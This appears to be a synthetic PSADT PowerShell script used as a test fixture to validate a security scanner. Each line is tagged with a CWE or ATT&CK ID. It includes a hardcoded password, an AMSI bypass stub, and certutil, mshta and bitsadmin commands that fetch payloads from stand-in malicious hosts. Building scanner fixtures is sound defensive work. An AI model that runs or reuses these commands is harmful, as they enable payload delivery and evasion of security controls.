# Test PSADT package - Deploy-Application.ps1
# Contains synthetic security issues for scanner validation
# *** DO NOT DEPLOY - FOR TESTING ONLY ***

# CRITICAL: Hardcoded credential (CWE-798, T1110)
$password = "Sup3rS3cretPa$$w0rd"

# CRITICAL: SecureString with plaintext (CWE-312, T1552)
$secPwd = ConvertTo-SecureString "MyPassword" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("admin", $secPwd)

# CRITICAL: Invoke-Expression dynamic execution (CWE-95, T1086)
Invoke-Expression $userInput

# HIGH: External download (T1105)
(New-Object System.Net.WebClient).DownloadFile($url, $dest)

# HIGH: Registry manipulation HKLM (T1112)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows" -Name "TestKey" -Value 1

# MEDIUM: Service creation (T1050)
New-Service -Name "TestService" -BinaryPathName "C:\test.exe" -DisplayName "Test"

# MEDIUM: Scheduled task (T1053)
Register-ScheduledTask -TaskName "TestTask" -Action (New-ScheduledTaskAction -Execute "test.exe")

# CRITICAL: PSADT v4 - ignore all exit codes (CWE-754)
Execute-ADTProcess -Path "setup.exe" -IgnoreExitCodes '*'

# CRITICAL: AMSI bypass via reflection (T1562.001)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# CRITICAL: LOLBin certutil abuse (T1140)
certutil -urlcache -f http://external.site/payload.exe C:\temp\payload.exe

# CRITICAL: LOLBin mshta abuse (T1218.005)
mshta.exe http://malicious.example.com/payload.hta

# HIGH: LOLBin bitsadmin (T1197)
bitsadmin /transfer "Job" http://external.com/file.exe C:\temp\file.exe

# CRITICAL: WMI Event Subscription persistence (T1546.003)
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent"

# CRITICAL: ETW tampering (T1562.006)
# EtwEventWrite bypass

# HIGH: PSADT deprecated v3 API usage
Show-InstallationProgress -StatusMessage "Installing..."
